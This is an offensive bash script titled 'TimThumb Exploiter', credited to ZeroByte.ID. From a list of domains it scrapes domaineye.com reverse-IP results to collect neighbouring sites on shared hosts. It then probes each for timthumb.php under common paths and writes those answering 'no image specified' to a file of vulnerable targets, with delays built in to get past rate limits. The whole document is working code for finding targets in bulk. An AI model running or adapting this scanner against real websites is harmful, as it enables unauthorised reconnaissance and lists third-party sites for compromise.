#!/bin/bash
# Reverse ip with domaineye.com | TimThumb Exploiter
# Coded By ZeroByte.ID
# https://zerobyte.id - http://blog.zerobyte.id/
function grab() {
    ip=$(dig +short $1 | head -1);
	see=$(timeout 10 curl -q -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" -s https://domaineye.com/reverse-ip/$ip);
	timeout 10 curl -q -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" -s https://domaineye.com/reverse-ip/$ip | grep "<div id='column1' class='column'><a href =" | sed "s|<a href = 'https://domaineye.com/similar/|\n|g" | cut -d ">" -f 1 | cut -d "'" -f 1 | sed '1d' >> simpen_nofilter.tmp
	echo "Grab $1 => $ip";
}
function timb() {
    ### ADD EXPLOIT ###
    echo $1"/timthumb.php" >> temp_timthumb.txt
    echo $1"/admin/timthumb.php" >> temp_timthumb.txt
    echo $1"/public/timthumb.php" >> temp_timthumb.txt
}
function cektim() {
    target=$1;
    cekti=$(timeout 5 curl -s --write-out %{http_code} -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" --output /dev/null $target);
    if [[ $cekti =~ '200' ]] || [[ $cekti =~ '400' ]]; then
        cektum=$(timeout 5 curl -s $target);
        if [[ $cektum =~ 'no image specified' ]]; then
            echo "[VULN] => $target";
            echo "$target" >> vuln_timthumb.txt
        else
            echo "[BAD] $target";
        fi
    else
        echo "[NOT FOUND]" $target;
    fi

}
cat << "ZERO"
 _____              _           _         _     _
|__  /___ _ __ ___ | |__  _   _| |_ ___  (_) __| |
  / // _ \ '__/ _ \| '_ \| | | | __/ _ \ | |/ _` |
 / /|  __/ | | (_) | |_) | |_| | ||  __/_| | (_| |
/____\___|_|  \___/|_.__/ \__, |\__\___(_)_|\__,_|
                          |___/                  
-------------------------------------------------
--------------- TimThumb Exploiter --------------
-------------------------------------------------
 
ZERO
echo -n "Masukan list : "; read list
for gudlo in $(cat $list); do
	grab $gudlo;
if [[ -z $see ]]; then
    echo "STOP";
    echo "WAITING FOR 10m"
    sleep 10m
    grab $gudlo
fi
	sleep 30s
done

echo "FILTERING";
sort simpen_nofilter.tmp | uniq >> simpen.lst
sleep 0.5s
echo "ADD LIST FOR TIMTHUMB";
for adlist in $(cat simpen.lst); do
    timb $adlist;
done
for target in $(cat temp_timthumb.txt); do
    cektim $target;
done

### REMOVE TEMP ###
rm simpen.lst temp_timthumb.txt simpen_nofilter.tmp -f
